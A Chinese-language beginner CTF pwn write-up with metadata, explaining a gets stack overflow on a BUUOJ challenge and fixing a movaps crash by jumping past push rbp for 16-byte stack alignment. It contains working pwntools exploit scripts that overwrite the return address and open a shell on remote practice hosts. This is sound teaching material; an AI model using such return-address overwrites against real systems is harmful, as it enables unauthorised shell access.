---
title: 从零开始学 PWN 01 - 缘起（栈对齐）
contest: 自学系列 (来源 ctfiot)
year: 2025
difficulty: easy
vuln_type:
- ret2libc
- pwn_unknown
tags:
- x86_64
- stack-alignment
- movaps
- gets
- BUUOJ
- cyclic
- pwntools
- prologue
- ret-sled
attack_chain:
- cyclic 100 生成模式串
- gdb 在 gets 断点看栈帧布局确认 offset=23
- payload = A*23 + p64(func_addr)
- system("/bin/sh") 调用触发 movaps 段错误
- 跳过 push rbp 把 ret 改到 func+1 修复 16 字节对齐
key_payload: p64(0x00401186+1) 即跳到 push rbp 之后
one_liner: 经典 pwn 入坑文 — x86_64 16 字节栈对齐 movaps 崩溃
lesson: x86_64 SystemV ABI 要求调用时 rsp % 16 == 0；劫持 ret 跳到 push rbp 之后可省一次 push 让栈对齐
quality: medium
full_path: 从零开始学PWN学01-_缘起.full.md
meta_path: 从零开始学PWN学01-_缘起.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 从零开始学 PWN 01 - 缘起（栈对齐）。经典 pwn 入坑文 — x86_64 16 字节栈对齐 movaps 崩溃。关键路径：cyclic 100 生成模式串 → gdb 在 gets 断点看栈帧布局确认 offset=23 → payload = A*23 + p64(func_addr)。经验：x86_64 SystemV ABI 要求调用时 rsp % 16 == 0；劫持 r...
category: pwn
subcategory: stack_overflow
subcategories:
- stack_overflow
- pwn_other
tools_used:
- pwntools
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/250955.html
reasoning_chain:
- BUUOJ 经典栈溢出题 gets → 触发点：栈对齐问题
- cyclic 100 生成模式串 → GDB 在 gets 断点看栈帧布局 → 确认 offset=23
- payload = A*23 + p64(func_addr) → system('/bin/sh') 调用 → 触发 movaps 段错误
- 假设：movaps 要求 16 字节对齐 → 动作：跳过 push rbp 把 ret 改到 func+1
- payload = A*23 + p64(0x00401186+1) → 跳到 push rbp 之后 → 栈对齐修复 → getshell
failed_attempts:
- 试图直接 system() 调用 → 失败：movaps 对齐错误 segfault
- 试图加 ret sled → 失败：对齐还是不对
- 试图用 call system 替代 ret → 失败：参数传递错
key_observations:
- x86_64 SystemV ABI 要求调用时 rsp % 16 == 0
- 劫持 ret 跳到 push rbp 之后可省一次 push 让栈对齐
- movaps 是 SSE 对齐检查，触发崩溃说明栈错位 8 字节
- cyclic + pattern_offset 测栈偏移是 pwn 第一步
prerequisites:
- x86_64 函数调用约定（System V AMD64 ABI）
- GDB 调试基础（断点/finish/栈帧）
- pwntools 基础（cyclic/p64/payload）
- 栈对齐与 SSE movaps 指令
---
# 从零开始学PWN学01: 缘起

> 原文: https://www.ctfiot.com/250955.html
> ID: 250955

0x00 前言

 

一直以来想对二进制对窥探一二，但前几年在攻防一线，涉及的都是web层的东西，工作中二进制一直也没什么场景。最近想来，总觉得有点遗憾。在之前的职业生涯当中，也多次建立过短暂的链接，但是缘分不深终究还是被搁浅了。

最近帮朋友A PJ某个应用，使用gdb/edb进行debug，过程踩坑无数，最后frida成功Crack掉了。随后又与朋友B研究他发现的堆溢出+业务逻辑组合漏洞构造稳定RCE利用，过程也是颇有意思。

深感缘分再来，就当作休息时做个玩具给自己找点乐子。不知道是否又像之前一样再次退去，总之随缘更新该系列。

缘起缘灭，缘聚缘散，皆是因果。

b gets # gets处下断点
finish # 让gets执行完毕，并在返回其被调用处停下
AAAA # 输入AAAA

地址

内容

备注

0x7fffffffe300

0x00

rsp

0x7fffffffe301

A

输入起始位

0x7fffffffe302

A

0x7fffffffe303

A

0x7fffffffe304

A

…

…

0x7fffffffe310

0x01

rbp

0x7fffffffe318

0x7ffff7c29d90

ret

首先我们来看一下正常的函数调用对应的汇编代码框架大致如下：

call func           ; push return address → rsp -= 8

func:
    ; 建立当前函数的栈帧
    push rbp        ; 保存调用者的        rsp -= 8
    mov  rbp, rsp   ; 设置当前栈帧基址

    ; ... 函数主体 ...

    ; 恢复调用者的栈帧
    mov  rsp, rbp   ; 丢弃当前栈帧中的局部变量区
    pop  rbp        ; 恢复调用者的        rsp += 8
    ret             ; 弹出返回地址并跳转   rsp += 8

所以我们可以发现只要刚开始栈顶地址是对齐的，调用完函数都是对齐的。

现在我们再回到，这道题的场景。在main方法ret后，栈顶地址是对齐，但是我们覆盖ret地址为了函数开头的push rbp，而不是call func处。这就导致与正常的函数调用相比，缺少了一次push。导致push次数为奇数了（每push一次rsp -= 8），进而栈顶地址不对齐。

所以解决的方案也很简单，少push一次或者多push一次。

本题当中，没有找到有call func的位置，所以选择跳过开头的push rbp减少一次push来达到栈顶地址对齐。

即把原来payload跳转地址0x00401186改成跳到0x00401187或0x0040118a都可以。

• x86_64 Linux 运行时栈的字节对齐[1]

• pwn system(“/bin/sh“)失败的原因_pwn movaps 对齐[2]


```
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
b gets # gets处下断点
finish # 让gets执行完毕，并在返回其被调用处停下
AAAA # 输入AAAA
0xF + 8 = 23
from pwn import *

system_sh_addr = 0x00401186 # fun函数地址
offset = 23
payload = offset * b'A' + p64(system_sh_addr)
p = process("./pwn1")

p.sendlineafter(b'please input', payload)
p.interactive()
call func           ; push return address → rsp -= 8

func:
    ; 建立当前函数的栈帧
    push rbp        ; 保存调用者的        rsp -= 8
    mov  rbp, rsp   ; 设置当前栈帧基址

    ; ... 函数主体 ...

    ; 恢复调用者的栈帧
    mov  rsp, rbp   ; 丢弃当前栈帧中的局部变量区
    pop  rbp        ; 恢复调用者的        rsp += 8
    ret             ; 弹出返回地址并跳转   rsp += 8
from pwn import *

system_sh_addr = 0x00401187
offset = 23
payload = offset * b'A' + p64(system_sh_addr)
p = remote('node5.buuoj.cn',25170)
    #p.sendlineafter(b'please input', payload)
p.sendline(payload);
print('[*] send payload finish!')
p.interactive()
ssize_t read(int fd, void *buf, size_t count);
from pwn import *

system_sh_addr = 0x004011fb
offset = 40
payload = offset * b'A' + p64(system_sh_addr)
p = remote('node5.buuoj.cn',27996)
p.sendline(payload);
p.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]